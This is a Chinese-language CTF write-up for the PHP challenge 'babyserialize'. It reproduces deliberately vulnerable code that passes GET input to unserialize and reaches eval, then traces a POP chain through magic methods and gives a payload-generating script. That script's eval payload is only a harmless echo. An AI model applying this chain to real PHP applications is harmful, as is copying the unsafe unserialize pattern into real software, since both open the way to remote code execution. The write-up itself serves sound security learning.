---
title: "babyserialize：PHP 反序列化与 POP 链分析"
subtitle: "从魔术方法的调用关系出发，梳理题目中的反序列化利用链。"
tags:
  - "#RCE"
  - "#反序列化"
  - "#web"
  - "#wakeup"
author: 冰冰洁
date: 2026-09-29 19:11
---
# 题目解析

```php
<?php  
include "waf.php";  
class NISA{  
    public $fun="show_me_flag";  
    public $txw4ever;  
    public function __wakeup()  
    {  
        if($this->fun=="show_me_flag"){ 
                   hint();  
        }  
    }  
  
    function __call($from,$val){
            $this->fun=$val[0];  
    }  
  
    public function __toString()  
    {  
        echo $this->fun;  
        return " ";  
    }  
    public function __invoke()  
    {        checkcheck($this->txw4ever);  
        @eval($this->txw4ever);  
    }  
}  
  
class TianXiWei{  
    public $ext;  
    public $x;  
    public function __wakeup()  
    {        $this->ext->nisa($this->x);  
    }  
}  
  
class Ilovetxw{  
    public $huang;  
    public $su;  
  
    public function __call($fun1,$arg){        $this->huang->fun=$arg[0];  
    }  
  
    public function __toString(){        $bb = $this->su;  
        return $bb();  
    }  
}  
  
class four{  
    public $a="TXW4EVER";  
    private $fun='abc';  
  
    public function __set($name, $value)  
    {        $this->$name=$value;  
        if ($this->fun = "sixsixsix"){ 
                   strtolower($this->a);  
        }  
    }  
}  
  
if(isset($_GET['ser'])){  
    @unserialize($_GET['ser']);  
}else{    highlight_file(__FILE__);  
}  
  
//func checkcheck($data){  
//  if(preg_match(......)){  
//      die(something wrong);  
//  }  
//}  
  
//function hint(){  
//    echo ".......";  
//    die();  
//}  
?>
```

打开题目发现很大一串，着实有被唬住。然后一个一个看代码：

- 关键在`eval()`函数，因此我们最终应该是需要执行invoke函数
- 执行invoke函数则需要把`nise`中的对象当作函数调用，因此需要使用`i love txw`这个类里面的`tostring`函数，将bb的值改成`nise`这个类中的对象
- 要触发这个函数，我们使用`four`类中的set函数，注意到set函数中第二个条件是恒等的。因此把a的值设成`ilovetxw`中的对象即可
- 但是在此之前我们还需要触发four的set函数，在之前需要从wake函数调到four函数，于是使用方法：利用反序列化自动触发 `TianXiWei::__wakeup()`，让它调用 `Ilovetxw` 中不存在的 `nisa()`，从而进入 `Ilovetxw::__call()`；`__call()` 又给 `four` 的私有属性 `fun` 赋值，因此触发 `four::__set()`

调用链如下：

```
TianXiWei::__wakeup()
        ↓
$ext->nisa($x)
        ↓
Ilovetxw 中没有 nisa()
        ↓
Ilovetxw::__call()
        ↓
$this->huang->fun = $arg[0]
        ↓
$four->fun = "trigger"
        ↓
fun 是 private
        ↓
four::__set()
        ↓ 
strtolower($this->a)
        ↓ 
Ilovetxw::__toString()
        ↓ 
$bb()
        ↓
NISA::__invoke()
       ↓ 
eval()
```

# payload


```php
<?php

class NISA{
    public $fun = "show_me_flag";
    public $txw4ever;
}

class TianXiWei{
    public $ext;
    public $x;
}

class Ilovetxw{
    public $huang;
    public $su;
}

class four{
    public $a = "TXW4EVER";
    private $fun = "abc";
}


/* 最终要进入 NISA::__invoke() */
$nisa = new NISA();
$nisa->txw4ever = 'echo "INVOKE_SUCCESS";';


/*
 * Ilovetxw::__toString():

 * $bb = $this->su;
 * return $bb();

 * 所以 su 必须指向 NISA
 */
$ilove2 = new Ilovetxw();
$ilove2->su = $nisa;


/*
 * four::__set():

 * strtolower($this->a);

 * 所以 a 放一个 Ilovetxw 对象
 */
$four = new four();
$four->a = $ilove2;


/*
 * Ilovetxw::__call():

 * $this->huang->fun = $arg[0];

 * 所以 huang 指向 four
 */
$ilove1 = new Ilovetxw();
$ilove1->huang = $four;


/*
 * TianXiWei::__wakeup():

 * $this->ext->nisa($this->x);

 * 所以 ext 指向 Ilovetxw
 */
$tian = new TianXiWei();
$tian->ext = $ilove1;
$tian->x = "trigger";


echo urlencode(serialize($tian));
```
